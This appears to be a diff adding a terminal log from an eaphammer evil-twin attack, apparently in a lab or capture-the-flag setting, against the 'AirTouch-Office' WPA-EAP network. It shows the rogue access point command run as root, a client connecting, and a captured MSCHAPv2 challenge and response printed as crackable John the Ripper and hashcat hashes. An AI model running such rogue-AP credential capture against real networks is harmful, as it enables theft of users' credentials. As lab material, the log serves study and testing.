@@ -1,0 +1,109 @@
+root@AirTouch-Consultant:~/eaphammer# ./eaphammer --creds -i wlan0 -e "AirTouch-Office" -b AC:8B:A9:AA:3F:D2 -c 44 --auth wpa-eap                                                                                                                            
+                                                                                                                                                                                                                                                             
+                     .__                                                                                                                                                                                                                                     
+  ____ _____  ______ |  |__ _____    _____   _____   ___________                                                                                                                                                                                             
+_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \                                                                                                                                                                                            
+\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/                                                                                                                                                                                            
+ \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|                                                                                                                                                                                               
+     \/     \/|__|        \/     \/      \/      \/     \/                                                                                                                                                                                                   
+                                                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                                             
+                        Now with more fast travel than a next-gen Bethesda game. >:D                                                                                                                                                                         
+                                                                                                                                                                                                                                                             
+                             Version:  1.14.0                                                                                                                                                                                                                
+                            Codename:  Final Frontier                                                                                                                                                                                                        
+                              Author:  @s0lst1c3                                                                                                                                                                                                             
+                             Contact:  gabriel<<at>>transmitengage.com                                                                                                                                                                                       
+                                                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                                             
+[?] Am I root?                                                                                                                                                                                                                                               
+[*] Checking for rootness...                                                                                                                                                                                                                                 
+[*] I AM ROOOOOOOOOOOOT                                                                                                                                                                                                                                      
+[*] Root privs confirmed! 8D                                                                                                                                                                                                                                 
+[*] Saving current iptables configuration...                                                                                                                                                                                                                 
+[*] Reticulating radio frequency splines...                                                                                                                                                                                                                  
+Error: Could not create NMClient object: Could not connect: No such file or directory.                                                                                                                                                                       
+                                                                                                                                                                                                                                                             
+[*] Using nmcli to tell NetworkManager not to manage wlan0...                                                                                                                                                                                                
+                                                                                                                                                                                                                                                             
+100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]
+      
+[*] Success: wlan0 no longer controlled by NetworkManager.
+[!] The hw_mode specified in hostapd.ini is invalid for the selected channel (g, 44)
+[!] Falling back to hw_mode: a
+[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-02-17-15-24-12-nZIY8hxXl3sZd9VQF00ijPEWWyDUWNOS.hccapx
+
+[hostapd] AP starting...
+
+Configuration file: /root/eaphammer/tmp/hostapd-2026-02-17-15-24-12-zl5rI5DwSg7VTXdgz2PKGOErkC6lq5MZ.conf
+rfkill: Cannot open RFKILL control device
+wlan0: interface state UNINITIALIZED->COUNTRY_UPDATE
+Using interface wlan0 with hwaddr ac:8b:a9:aa:3f:d2 and ssid "AirTouch-Office"
+wlan0: interface state COUNTRY_UPDATE->ENABLED
+wlan0: AP-ENABLED 
+
+
+Press enter to quit...
+
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: associated (aid 1)
+wlan0: CTRL-EVENT-EAP-STARTED 28:6c:07:12:ee:a1
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+wlan0: CTRL-EVENT-EAP-RETRANSMIT 28:6c:07:12:ee:a1
+wlan0: CTRL-EVENT-EAP-RETRANSMIT 28:6c:07:12:ee:a1
+wlan0: CTRL-EVENT-EAP-RETRANSMIT 28:6c:07:12:ee:a1
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
+wlan0: CTRL-EVENT-EAP-RETRANSMIT 28:6c:07:12:ee:a1
+wlan0: CTRL-EVENT-EAP-RETRANSMIT 28:6c:07:12:ee:a1
+wlan0: CTRL-EVENT-EAP-RETRANSMIT 28:6c:07:12:ee:a1
+wlan0: CTRL-EVENT-EAP-TIMEOUT-FAILURE 28:6c:07:12:ee:a1
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: deauthenticated due to local deauth request
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: associated (aid 1)
+wlan0: CTRL-EVENT-EAP-STARTED 28:6c:07:12:ee:a1
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+
+
+mschapv2: Tue Feb 17 15:28:42 2026
+         domain\username:               AirTouch\r4ulcl
+         username:                      r4ulcl
+         challenge:                     4d:35:6d:98:ee:87:5b:5a
+         response:                      58:4d:4e:29:be:0a:dd:2e:36:2d:95:8d:f1:a6:32:7d:5e:7b:9f:f7:b3:f7:b4:dc
+
+         jtr NETNTLM:                   r4ulcl:$NETNTLM$4d356d98ee875b5a$584d4e29be0add2e362d958df1a6327d5e7b9ff7b3f7b4dc
+
+         hashcat NETNTLM:               r4ulcl::::584d4e29be0add2e362d958df1a6327d5e7b9ff7b3f7b4dc:4d356d98ee875b5a
+
+
+wlan0: CTRL-EVENT-EAP-FAILURE 28:6c:07:12:ee:a1
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: deauthenticated due to local deauth request
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
+wlan0: STA 28:6c:07:12:ee:a1 IEEE 802.11: authenticated
+
+[hostapd] Terminating event loop...
+[hostapd] Event loop terminated.
+[hostapd] Hostapd worker still running... waiting for it to join.
+
+wlan0: interface state ENABLED->DISABLED
+wlan0: AP-DISABLED 
+wlan0: CTRL-EVENT-TERMINATING 
+nl80211: deinit ifname=wlan0 disabled_11b_rates=0
+
+[hostapd] Worker joined.
+[hostapd] AP disabled.
+
+Error: Could not create NMClient object: Could not connect: No such file or directory.
+
+[*] Using nmcli to give NetworkManager control of wlan0...
+
+100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]
+
+[*] Success: wlan0 is now managed by NetworkManager.
